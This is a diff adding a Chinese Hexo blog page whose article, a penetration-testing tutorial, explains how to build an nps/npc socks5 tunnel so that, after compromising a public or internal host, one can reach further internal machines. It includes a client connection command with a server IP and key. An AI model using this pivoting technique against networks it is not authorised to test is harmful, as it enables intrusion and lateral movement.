+allow_tunnel_num_limit=false
+allow_local_proxy=false
+allow_connection_num_limit=false
+allow_multi_ip=false
+system_info_display=false
+
+#cache
+http_cache=false
+http_cache_length=100
+
+#get origin ip
+http_add_origin_header=false
+
+#pprof debug options
+#pprof_ip=0.0.0.0
+#pprof_port=9999
+
+#client disconnect timeout
+#客户端断开连接超时
+disconnect_timeout=60
+</code></pre>
+<p>然后用命令<code>./nps</code>​开启服务</p>
+<p>‍</p>
+<p>访问<code>vps_ip:vps_port</code>​</p>
+<p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605092440-yo0xivz.png" alt="image">​</p>
+<p>登陆，创建一个客户端连接：</p>
+<p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605092542-1zhcg95.png" alt="image">​</p>
+<p>配置好选项：</p>
+<p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605092728-d4b3yxn.png" alt="image">​</p>
+<p>上图分别对应客户端这三个配置：</p>
+<p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605092840-t69a7i2.png" alt="image">​</p>
+<p><strong>！！这里的</strong>​<code>**basic_username**</code>​<strong>和</strong>​<code>**basic_password**</code>​<strong>也是后续使用socks5代理要配置的账号密码！！</strong></p>
+<p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605093028-5qdy9sy.png" alt="image">​</p>
+<p>然后配置服务器端口，就是socks5的端口，这里选择8888，默认是8003</p>
+<p>​​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605152743-k64izeb.png" alt="image">​​</p>
+<p>‍</p>
+<p>客户端连接的命令：</p>
+<pre class=" language-bash"><code class="language-bash"> ./npc -server<span class="token operator">=</span>123.249.8.26:8024 -vkey<span class="token operator">=</span>12345 -type<span class="token operator">=</span>tcp
+</code></pre>
+<p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605093311-nfddn4o.png" alt="image">​</p>
+<p>连接成功后的显示就是这样</p>
+<p>‍</p>
+<p>可以利用<a href="moz-extension://2e4a675b-9830-4fa5-b674-aded830c42cd/options.html#!/about" title="关于">SwitchyOmega</a>来验证一下连接的成功性：</p>
+<p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605093406-srqmv51.png" alt="image">​</p>
+<p>然后点击那个锁配置密码：</p>
+<p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605093456-o0h2icg.png" alt="image">​</p>
+<p>‍</p>
+<p>访问一下内网地址，发现成功访问，即为穿透成功</p>
+<p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605152723-y8e0dv7.png" alt="image">​</p>
+<p>‍</p>
+<h2 id="内网机器不出网如何搭建隧道"><a href="#内网机器不出网如何搭建隧道" class="headerlink" title="内网机器不出网如何搭建隧道"></a>内网机器不出网如何搭建隧道</h2><p>我们来看一下连接的拓扑图是如何的</p>
+<p>​​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605160108-f6213a1.png" alt="image">​​</p>
+<p>这里就是通过socks5代理以vps为服务端，内网机器1为客户端达到内网穿透访问内网机器.这种利用VPS的场景更常见于拿下了公网的服务器，想要进一步渗透内网机器。</p>
+<p>首先通过这个拓扑图我们要明白：</p>
+<pre class=" language-xml"><code class="language-xml">穿透是指穿透客户端相关整个网段的机器
+</code></pre>
+<p>如何理解呢？</p>
+<ol>
+<li>如果我们要穿透10网段的地址，需要把客户端放在我们可以访问的10网段。就如上图的内网机器1，因为他同时拥有192的网段和10的网段，利用他我们就可以达到穿透10网段的目的。</li>
+<li>如果再有10地址的机器，如<code>10.10.11.200</code>​、<code>10.10.11.215</code>​等等我们都可以利用这个搭建好的隧道访问到</li>
+<li>要和服务端区别开，服务端只是双方均可访问到的桥梁，并不能作为内网穿透的目标网段。简单而言就是你本机是访问不到vps中转服务端的内网地址的。</li>
+</ol>
+<p>其次我们可以屏蔽中间人的请求，直接对内网机器2发送请求。那么这个中间人是否可以再操作？</p>
+<p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605161532-v7mwcyg.png" alt="image">​</p>
+<p>可以注意到，我们其实和内网机器1是在同一个网段的，所以我们可以摒弃VPS中转服务端。直接利用内网机器1进行流量代理，所以可以直接把内网机器1当作服务端和客户端，自己连接自己。我们通过建立的socks5代理达到内网穿透的目的。</p>
+<p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605160613-26u86es.png" alt="image">​</p>
+<p>我们通过连接好的socks5代理，试试看内网穿透能否成功;</p>
+<p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605160715-gbghvn8.png" alt="image">​</p>
+<p>可以看到成功达到内网穿透</p>
+<p>那么这种方法有何意义或者作用呢？</p>
+<p>在某次实战中有这样一个问题：</p>
+<p>现在已经拿下了内网机器机器1，想要继续访问内网机器2。但是内网机器1他不出网，而且没有web服务。</p>
+<p>确实可以利用MSF正向的方法，建立连接，然后使用route配置路由访问。当时不会这一条路，建立了正向连接无法访问内网机器2的web服务，无法进行下一步渗透。</p>
+<p>此时想要建立隧道就可以使用上述方法，把内网机器1同时当作客户端和服务端我们就可以内网穿透达到访问内网机器2的目的。</p>
+<p>‍</p>
+<p>‍</p>
+<p>关于MSF的内网利用和CS的内网利用后续更新…</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'ComjO6HnVsr1xOv8hNwQ8iXY-gzGzoHsz',
+        appKey: 'jUr4hlk8CSkRFFeoyiMvBesp',
+        serverURLs: 'https://comjo6hn.lc-cn-n1-shared.com',
+        notify: 'true' === 'true',
+        verify: 'true' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: 'just go go'
+    });
+</script>
+
+<!--酷Q推送-->
+
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2023/06/11/vulhub%E6%89%93%E9%9D%B6%E7%AC%AC%E4%BA%8C%E5%91%A8/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="vulhub打靶第二周">
+                        
+                        <span class="card-title">vulhub打靶第二周</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-06-11
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%B8%97%E9%80%8F/" class="post-category">
+                                    渗透
+                                </a>
+                            
+                            <a href="/categories/%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA/" class="post-category">
+                                    靶机
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2023/06/04/HTB%20Format/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="HTB_Format">
+                        
+                        <span class="card-title">HTB_Format</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-06-04
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%B8%97%E9%80%8F/" class="post-category">
+                                    渗透
+                                </a>
+                            
+                            <a href="/categories/%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA/" class="post-category">
+                                    靶机
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2023</span>
+            
+            <a href="/about" target="_blank">清风</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">51.5k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1111" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1111" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+    
+
+</body>
+
+</html>
